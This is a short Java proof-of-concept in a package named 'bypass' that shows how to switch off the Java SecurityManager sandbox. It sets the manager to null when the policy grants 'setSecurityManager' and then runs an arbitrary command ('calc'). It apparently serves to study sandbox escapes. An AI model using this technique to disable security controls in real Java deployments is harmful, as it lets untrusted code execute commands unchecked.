package bypass;

import java.io.IOException;

//如果配置文件允许setSecurityManager
//grant {
//    permission java.lang.RuntimePermission "setSecurityManager";
//};
public class SetNull {
    public static void main(String[] args) throws IOException {
        SecurityManager securityManager = new SecurityManager();
        System.setSecurityManager(securityManager);

        System.setSecurityManager(null);
        Runtime.getRuntime().exec("calc");
    }
}
